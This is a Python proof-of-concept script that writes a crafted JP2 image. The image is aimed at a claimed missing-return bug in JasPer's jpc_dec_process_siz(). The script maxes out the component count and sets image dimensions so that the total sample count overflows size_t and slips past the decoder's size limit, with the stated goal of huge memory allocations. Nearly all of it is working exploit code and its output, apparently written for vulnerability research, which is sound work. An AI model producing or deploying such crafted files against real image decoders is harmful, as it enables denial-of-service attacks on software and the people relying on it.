#!/usr/bin/env python3
"""
vuln_002_gen.py - Generate a JP2 file to trigger VULN-002 in jpc_dec_process_siz()

Vulnerability: jpc_dec.c lines 1282-1284
  if (!jas_safe_size_add(num_samples, num_samples_delta, &num_samples)) {
      jas_eprintf("image too large\n");
      /* BUG: missing return -1 here */
  }

When jas_safe_size_add returns false (cumulative sample count overflows size_t),
the code prints an error but continues. With --max-samples 0 (which sets
dec->max_samples = 0), the subsequent limit check at line 1287 is also bypassed:
  if (dec->max_samples > 0 && num_samples > dec->max_samples)  <- always false

This allows decoding to proceed with a corrupted (overflowed) num_samples value,
potentially leading to enormous memory allocations.

Trigger condition:
  Csiz = 16384 (maximum number of components per JPEG-2000 spec)
  W = H = 2^26 = 67108864
  Per-component samples: W*H = 2^52 (no overflow in jas_safe_size_mul)
  Cumulative sum overflows size_t (2^64) after ~4096 components:
    4096 * 2^52 = 2^64 > SIZE_MAX

Usage:
  python3 vuln_002_gen.py [output.jp2]
"""

import struct
import sys
import os


def pack_box(box_type, data):
    """Pack a JP2 box: 4-byte length (including header) + 4-byte type + data."""
    if isinstance(box_type, str):
        box_type = box_type.encode('ascii')
    length = 8 + len(data)
    return struct.pack('>I4s', length, box_type) + data


def generate_poc(output_path):
    # ---------------------------------------------------------------------------
    # Key parameters
    # ---------------------------------------------------------------------------
    NUM_COMPS = 16384        # 2^14 = 0x4000 (maximum Csiz per JPEG-2000 spec)
    WIDTH     = 67108864     # 2^26
    HEIGHT    = 67108864     # 2^26
    # Per-component sample count: 2^26 * 2^26 = 2^52 -- fits in size_t (no mul overflow)
    # Cumulative sum after 4097+ components: > 2^64 -- triggers add overflow (bug site)

    # ---------------------------------------------------------------------------
    # 1. JP2 Signature Box (12 bytes total)
    # ---------------------------------------------------------------------------
    sig_box = struct.pack('>I4sBBBB',
        12, b'jP  ',
        0x0D, 0x0A, 0x87, 0x0A)

    # ---------------------------------------------------------------------------
    # 2. File Type Box (ftyp)
    # ---------------------------------------------------------------------------
    ftyp_data = b'jp2 ' + struct.pack('>I', 0) + b'jp2 '  # brand + minv + compat
    ftyp_box  = pack_box(b'ftyp', ftyp_data)

    # ---------------------------------------------------------------------------
    # 3. JP2 Header superbox (jp2h) containing ihdr + colr
    # ---------------------------------------------------------------------------
    # ihdr: height(4) + width(4) + ncomp(2) + bpc(1) + c(1) + unk(1) + ipr(1) = 14 bytes
    # Use small placeholder dimensions in ihdr; real dims are in SIZ marker
    ihdr_data = struct.pack('>IIHBBBB',
        1,          # height placeholder
        1,          # width placeholder
        NUM_COMPS,  # number of components
        0x07,       # bpc = 8-bit unsigned (depth-1=7)
        0x07,       # C = compression type 7 (unspecified)
        0x00,       # UnkC
        0x00)       # IPR
    ihdr_box = pack_box(b'ihdr', ihdr_data)

    # colr: meth(1) + prec(1) + approx(1) + enumCS(4) = 7 bytes
    colr_data = struct.pack('>BBBI', 1, 0, 0, 16)   # enumCS 16 = sRGB
    colr_box  = pack_box(b'colr', colr_data)

    jp2h_box = pack_box(b'jp2h', ihdr_box + colr_box)

    # ---------------------------------------------------------------------------
    # 4. Contiguous Codestream Box (jp2c) with length=0 (extends to EOF)
    # ---------------------------------------------------------------------------
    # SOC marker
    soc = struct.pack('>H', 0xFF4F)

    # SIZ marker
    # Lsiz (2) + fixed fields (36) + 3*N component fields
    # Fixed fields: Rsiz(2)+Xsiz(4)+Ysiz(4)+XOsiz(4)+YOsiz(4)+
    #               XTsiz(4)+YTsiz(4)+XTOsiz(4)+YTOsiz(4)+Csiz(2) = 36 bytes
    Lsiz = 2 + 36 + 3 * NUM_COMPS   # includes 2-byte Lsiz field itself
    siz_fixed = struct.pack('>HIIIIIIIIH',
        0,          # Rsiz
        WIDTH,      # Xsiz
        HEIGHT,     # Ysiz
        0,          # XOsiz
        0,          # YOsiz
        WIDTH,      # XTsiz (one tile = full image)
        HEIGHT,     # YTsiz
        0,          # XTOsiz
        0,          # YTOsiz
        NUM_COMPS)  # Csiz
    # Each component: Ssiz=0x07 (8-bit unsigned), XRsiz=1, YRsiz=1
    comp_data = b'\x07\x01\x01' * NUM_COMPS

    siz_marker = struct.pack('>HH', 0xFF51, Lsiz) + siz_fixed + comp_data

    # EOC marker (end of codestream)
    eoc = struct.pack('>H', 0xFFD9)

    codestream = soc + siz_marker + eoc

    # jp2c box with length=0 (box extends to end of file)
    jp2c_box = struct.pack('>I4s', 0, b'jp2c') + codestream

    # ---------------------------------------------------------------------------
    # Assemble and write
    # ---------------------------------------------------------------------------
    jp2_data = sig_box + ftyp_box + jp2h_box + jp2c_box

    with open(output_path, 'wb') as f:
        f.write(jp2_data)

    print(f"[+] PoC written to: {output_path}")
    print(f"    Components (Csiz): {NUM_COMPS} = 0x{NUM_COMPS:04X}")
    print(f"    Width x Height:    {WIDTH} x {HEIGHT}  (2^26 x 2^26)")
    print(f"    Per-comp samples:  {WIDTH * HEIGHT}  (2^52, fits in size_t)")
    print(f"    Overflow after:    ~{(2**64) // (WIDTH * HEIGHT)} components")
    print(f"    SIZ marker size:   {len(siz_marker)} bytes")
    print(f"    Total file size:   {len(jp2_data)} bytes")


if __name__ == '__main__':
    out = sys.argv[1] if len(sys.argv) > 1 else \
        os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_002.jp2')
    generate_poc(out)
